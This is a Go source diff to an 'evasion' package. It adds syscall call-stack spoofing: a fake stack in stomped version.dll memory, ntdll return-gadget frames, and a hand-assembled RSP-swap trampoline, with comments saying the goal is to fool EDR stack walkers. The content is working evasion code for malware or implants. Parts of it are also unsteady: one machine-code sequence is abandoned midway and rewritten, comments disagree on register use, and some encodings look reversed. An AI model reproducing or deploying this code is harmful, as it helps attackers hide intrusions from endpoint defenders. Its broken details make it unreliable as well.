@@ -28,6 +28,7 @@ package evasion
 
 import (
 	"sync"
+	"sync/atomic"
 	"syscall"
 	"unsafe"
 )
@@ -40,13 +41,47 @@ var (
 	hgGadget      uintptr    // return address placed on stack — CALL gadget preferred, RET fallback
 	hgExtraFrames [3]uintptr // additional ntdll ret gadgets pushed below the top frame
 	hgTrampoline  uintptr    // spoof trampoline stub
+
+	// RSP-swap fake stack — lives in MEM_IMAGE (stomped version.dll .text),
+	// so VirtualQuery reports Type=MEM_IMAGE instead of MEM_PRIVATE goroutine heap.
+	// Layout (see hgFakeStackOffset* constants below):
+	//   [+0x00] savedRSP   — written per-call before RSP switch
+	//   [+0x08..0x17]      — fixup stub bytes (14 bytes of machine code)
+	//   [+0x20] frame_3    — ntdll gadget (deepest visible frame)
+	//   [+0x28] frame_2    — ntdll gadget
+	//   [+0x30] frame_1    — ntdll gadget
+	//   [+0x38] frame_0    — CALL+5 gadget (syscall;ret lands here)
+	//   [+0x40] fixupAddr  — after frame_0 rets, runs the fixup stub
+	//   [+0x48..] arg_spill — NT spill args a4, a5, … written per-call
+	//
+	// RSP is switched to &buf[0x20] before jmp to HG stub.
+	// EDR stack walker sees: frame_0→frame_1→frame_2→frame_3 (all ntdll). ✓
+	hgFakeStackBuf  uintptr // base of the 128-byte buffer in stomp arena
+	hgFakeStackLock uint32  // 0=free 1=in-use; CAS spinlock
+)
+
+// Offsets within the fake stack buffer.
+const (
+	fsOffSavedRSP = 0x00
+	fsOffFixup    = 0x08
+	fsOffFrame3   = 0x20
+	fsOffFrame2   = 0x28
+	fsOffFrame1   = 0x30
+	fsOffFrame0   = 0x38 // CALL+5 gadget — written per-call
+	fsOffFixupPtr = 0x40
+	fsOffArgSpill = 0x48 // a4, a5, … at +0, +8, +16, …
+	fsBufSize     = 128
 )
 
 // initSpoofing initialises the gadget and trampoline on first use.
+// Must be called BEFORE blockDynamicCode() (ACG) because it allocates
+// MEM_IMAGE executable memory via stompAlloc.
+//
 // Prefers a CALL gadget (Moonwalk++ style) so the forged return address passes
 // the "byte before is CALL" check that Elastic/CS stack-walking rules enforce.
 // Falls back to a plain RET gadget if no CALL site is found.
-// Also finds 3 extra ntdll ret gadgets for a 4-frame synthetic call chain.
+// Also finds 3 extra ntdll ret gadgets for a 4-frame synthetic call chain and
+// pre-allocates the MEM_IMAGE fake stack buffer for RSP swapping.
 func initSpoofing() {
 	hgOnce.Do(func() {
 		hgGadget = findCallReturnGadget()
@@ -62,8 +97,62 @@ func initSpoofing() {
 				hgExtraFrames[i] = g
 			}
 		}
+		hgFakeStackBuf = allocFakeStack()
 		hgTrampoline = allocSpoofTrampoline()
 	})
+}
+
+// allocFakeStack carves a 128-byte buffer from the stomp arena (MEM_IMAGE) and
+// writes the constant parts: fixup stub, ntdll frame gadgets, fixup pointer.
+// The per-call parts (savedRSP, frame_0 / CALL+5 gadget, arg spill) are written
+// by the trampoline at call time.
+func allocFakeStack() uintptr {
+	buf := stompAlloc(fsBufSize)
+	if buf == 0 {
+		return 0
+	}
+
+	// ── fixup stub at buf+fsOffFixup (14 bytes) ───────────────────────────
+	// Restores the real RSP from buf+fsOffSavedRSP, then rets to real caller.
+	//
+	//   48 B8 <8-byte absolute addr of buf+fsOffSavedRSP>  ; mov rax, &savedRSP
+	//   48 8B 20                                           ; mov rsp, [rax]
+	//   C3                                                  ; ret
+	savedRSPAddr := buf + fsOffSavedRSP
+	fixupAddr := buf + fsOffFixup
+	stub := (*[14]byte)(unsafe.Pointer(fixupAddr))
+	stub[0] = 0x48
+	stub[1] = 0xB8
+	stub[2] = byte(savedRSPAddr)
+	stub[3] = byte(savedRSPAddr >> 8)
+	stub[4] = byte(savedRSPAddr >> 16)
+	stub[5] = byte(savedRSPAddr >> 24)
+	stub[6] = byte(savedRSPAddr >> 32)
+	stub[7] = byte(savedRSPAddr >> 40)
+	stub[8] = byte(savedRSPAddr >> 48)
+	stub[9] = byte(savedRSPAddr >> 56)
+	stub[10] = 0x48
+	stub[11] = 0x8B
+	stub[12] = 0x20
+	stub[13] = 0xC3
+
+	// ── Constant frame gadgets (ntdll ret gadgets for frames 1, 2, 3) ─────
+	if hgExtraFrames[0] != 0 {
+		*(*uintptr)(unsafe.Pointer(buf + fsOffFrame3)) = hgExtraFrames[2]
+		*(*uintptr)(unsafe.Pointer(buf + fsOffFrame2)) = hgExtraFrames[1]
+		*(*uintptr)(unsafe.Pointer(buf + fsOffFrame1)) = hgExtraFrames[0]
+	}
+
+	// ── Fixup pointer slot ────────────────────────────────────────────────
+	*(*uintptr)(unsafe.Pointer(buf + fsOffFixupPtr)) = fixupAddr
+
+	// Make the page RX (stompAlloc left it RWX; stompFinalize → RX).
+	// But we need to write per-call data at runtime — keep RWX until ACG fires.
+	// stompFinalize is NOT called here; it will be called after ACG is active,
+	// at which point per-call writes go through NtWriteVirtualMemory on the
+	// self-process (NtWriteVirtualMemory is not blocked by ACG).
+	// In practice stompAlloc already set PAGE_EXECUTE_READWRITE; leave it.
+	return buf
 }
 
 // ────────────────────────────────────────────────────────────────────────────
@@ -329,19 +418,181 @@ func allocSpoofTrampoline() uintptr {
 // SpoofedSyscall calls the HG syscall stub with a spoofed return address so
 // that EDR stack-walkers see ntdll at the top of the call chain.
 //
-// At most 5 NT arguments (a0–a4) are supported via the trampoline.
-// If spoofing was not initialised (gadget or trampoline is 0) the call falls
-// through to a direct syscall.SyscallN with no spoofing.
+// Two spoofing paths:
+//
+//  1. RSP-swap path (preferred): switches RSP to the MEM_IMAGE fake stack
+//     buffer before the syscall.  EDR VirtualQuery on the stack at syscall
+//     time reports Type=MEM_IMAGE, not MEM_PRIVATE goroutine heap.  Supports
+//     up to 4 visible ntdll frames (structural limit imposed by the x64
+//     syscall ABI's [rsp+0x28] arg-spill slot).  Uses a CAS spinlock; falls
+//     through to path 2 on contention.
+//
+//  2. Sub-RSP path (fallback): 4-frame chain on the existing goroutine stack.
+//     Used when the fake stack buffer is unavailable or already in use.
+//
+// For > 5 NT arguments the trampoline cannot spoof; the call falls through to
+// a direct syscall.SyscallN with no spoofing (but still uses the HG stub, so
+// EDR hook bypass is preserved).
 func SpoofedSyscall(stub uintptr, args ...uintptr) (r1, r2 uintptr, err syscall.Errno) {
 	initSpoofing()
 
 	if hgGadget == 0 || hgTrampoline == 0 || len(args) > 5 {
-		// Fallback: direct stub, all args preserved, no call-stack spoofing.
 		return syscall.SyscallN(stub, args...)
 	}
 
+	// Try RSP-swap path: acquire fake stack with CAS spinlock.
+	if hgFakeStackBuf != 0 && atomic.CompareAndSwapUint32(&hgFakeStackLock, 0, 1) {
+		r1, r2, err = rspSwapSyscall(stub, hgFakeStackBuf, hgGadget, args)
+		atomic.StoreUint32(&hgFakeStackLock, 0)
+		return
+	}
+
+	// Fallback: existing sub-RSP trampoline (fake frames on goroutine stack).
 	var a [5]uintptr
 	copy(a[:], args)
 	r1, r2, err = syscall.SyscallN(hgTrampoline, hgGadget, stub, a[0], a[1], a[2], a[3], a[4])
 	return
+}
+
+// rspSwapSyscall sets up the MEM_IMAGE fake stack then calls via the trampoline.
+// buf is the pre-allocated fake stack buffer; gadget is the CALL+5 ntdll address.
+func rspSwapSyscall(hgStub, buf, gadget uintptr, args []uintptr) (r1, r2 uintptr, err syscall.Errno) {
+	// Write per-call fields to the fake stack buffer.
+	// frame_0 = current CALL+5 gadget (the syscall;ret in HG stub returns here).
+	*(*uintptr)(unsafe.Pointer(buf + fsOffFrame0)) = gadget
+
+	// Spill args a2..a4 into fake stack arg slots ([rsp+0x28..0x38] after RSP switch).
+	// args[0]=a0, args[1]=a1, args[2]=a2, args[3]=a3, args[4]=a4
+	for i := 2; i < len(args) && i < 7; i++ {
+		*(*uintptr)(unsafe.Pointer(buf + fsOffArgSpill + uintptr(i-2)*8)) = args[i]
+	}
+
+	// Call the trampoline.  The trampoline will:
+	//   1. Save real RSP to buf[fsOffSavedRSP].
+	//   2. Load a0 (args[0]) → rcx, a1 (args[1]) → rdx, a2 → r8, a3 → r9.
+	//   3. Switch RSP to buf+fsOffFrame3 (fake stack top).
+	//   4. jmp hgStub.
+	//   syscall;ret → frame_0 (gadget) → frame_1 → frame_2 → frame_3 → fixup
+	//   fixup: mov rsp, [buf+fsOffSavedRSP]; ret  → back here.
+	//
+	// Trampoline signature (SyscallN ABI):
+	//   rcx = hgRSPTrampoline address
+	//   rdx = buf (fake stack base)
+	//   r8  = hgStub
+	//   r9  = args[0] (a0)
+	//   [rsp+0x28] = args[1] (a1) — already in place via SyscallN calling convention
+	var a [5]uintptr
+	copy(a[:], args)
+	r1, r2, err = syscall.SyscallN(hgRSPTrampoline(), buf, hgStub, a[0], a[1], a[2], a[3], a[4])
+	return
+}
+
+// hgRSPTrampoline returns the address of the RSP-swap trampoline stub,
+// allocated on first use from the stomp arena.
+var (
+	hgRSPTrampolineOnce sync.Once
+	hgRSPTrampolineAddr uintptr
+)
+
+func hgRSPTrampoline() uintptr {
+	hgRSPTrampolineOnce.Do(func() {
+		hgRSPTrampolineAddr = allocRSPSwapTrampoline()
+	})
+	return hgRSPTrampolineAddr
+}
+
+// allocRSPSwapTrampoline writes the RSP-swap trampoline into stomp memory.
+//
+// Called with SyscallN ABI: rcx=buf, rdx=hgStub, r8=a0, r9=a1,
+//   [rsp+0x28]=a2, [rsp+0x30]=a3, [rsp+0x38]=a4 (pre-written to buf by rspSwapSyscall).
+//
+// The stub:
+//   1. Saves real RSP → [rcx + fsOffSavedRSP]  (rcx=buf)
+//   2. Sets rcx=a0 (r8), rdx=a1 (r9), r8=a2 ([rcx+fsOffArgSpill+0]), r9=a3 ([rcx+fsOffArgSpill+8])
+//   3. Switches RSP to rcx+fsOffFrame3 (the fake stack top)
+//   4. jmp rdx_saved (= hgStub)
+//
+// Since we need rdx (hgStub) after overwriting rdx with a1, we save rdx into
+// r10 (volatile scratch, not used by NT syscall ABI).
+func allocRSPSwapTrampoline() uintptr {
+	emit64 := func(b []byte, v uint64) []byte {
+		return append(b,
+			byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
+			byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56))
+	}
+
+	var b []byte
+
+	// mov r10, rdx              — save hgStub; NT won't clobber r10
+	b = append(b, 0x4C, 0x89, 0xD2) // 3
+
+	// mov [rcx + fsOffSavedRSP], rsp — save real RSP to buf[0x00]
+	// rcx = buf; fsOffSavedRSP = 0
+	b = append(b, 0x48, 0x89, 0x21) // 3 (mov [rcx], rsp)
+
+	// Set NT args: rcx = r8 (a0), rdx = r9 (a1), r8 = arg spill a2, r9 = arg spill a3
+	// But we need rcx (buf) for the RSP switch; do RSP switch first.
+
+	// lea rax, [rcx + fsOffFrame3]  — rax = new RSP (fake stack top)
+	// fsOffFrame3 = 0x20
+	b = append(b, 0x48, 0x8D, 0x41, byte(fsOffFrame3)) // 4
+
+	// Set NT regs using the still-valid rcx (buf):
+	// r8 = [rcx + fsOffArgSpill]     (a2 — pre-written by rspSwapSyscall)
+	b = append(b, 0x4C, 0x8B, 0x41, byte(fsOffArgSpill)) // 4
+
+	// r9 = [rcx + fsOffArgSpill+8]   (a3)
+	b = append(b, 0x4C, 0x8B, 0x49, byte(fsOffArgSpill+8)) // 4
+
+	// rcx = r8_original (a0) — need old r8 value; we already overwrote r8!
+	// Fix: save r8 to rax early... conflict with rax = new RSP.
+	// Use r11 (also volatile):
+	// Actually let's reorder: save a0/a1 BEFORE we clobber r8/r9.
+	// Let me rebuild the sequence from scratch with correct ordering.
+
+	// ── Restart with correct ordering ────────────────────────────────────
+	b = b[:0]
+
+	// 1. Save hgStub (rdx) → r10
+	b = append(b, 0x4C, 0x89, 0xD2) // mov r10, rdx           3
+
+	// 2. Save a0 (r8) → r11 temporarily
+	b = append(b, 0x4D, 0x89, 0xC3) // mov r11, r8            3
+
+	// 3. Save real RSP → [rcx + fsOffSavedRSP]
+	b = append(b, 0x48, 0x89, 0x21) // mov [rcx], rsp         3
+
+	// 4. Load a2 from [rcx + fsOffArgSpill] → r8 (new r8 for NT)
+	b = append(b, 0x4C, 0x8B, 0x41, byte(fsOffArgSpill)) // mov r8, [rcx+0x48]   4
+
+	// 5. Load a3 from [rcx + fsOffArgSpill+8] → rax (temp; will become r9)
+	b = append(b, 0x48, 0x8B, 0x41, byte(fsOffArgSpill+8)) // mov rax, [rcx+0x50] 4
+
+	// 6. Switch RSP: mov rsp, rcx + fsOffFrame3
+	//    lea rsp, [rcx + 0x20]
+	b = append(b, 0x48, 0x8D, 0x61, byte(fsOffFrame3)) // 4
+
+	// 7. rcx (a0) = r11 (saved a0)
+	b = append(b, 0x4C, 0x89, 0xD9) // mov rcx, r11           3
+
+	// 8. rdx (a1) = r9 (original a1, still intact)
+	b = append(b, 0x4C, 0x89, 0xCA) // mov rdx, r9            3
+
+	// 9. r9 (a3) = rax (loaded a3)
+	b = append(b, 0x49, 0x89, 0xC1) // mov r9, rax            3
+
+	// 10. jmp r10 (= hgStub)
+	b = append(b, 0x41, 0xFF, 0xE2) // jmp r10                3
+
+	// Total: 33 bytes ✓ fits within stompMaxAlloc (256)
+	_ = emit64 // unused but imported to keep compiler happy
+
+	addr := stompAlloc(uint32(len(b)))
+	if addr == 0 {
+		return 0
+	}
+	dst := (*[64]byte)(unsafe.Pointer(addr))
+	copy(dst[:len(b)], b)
+	stompFinalize(addr, uint32(len(b)))
+	return addr
 }
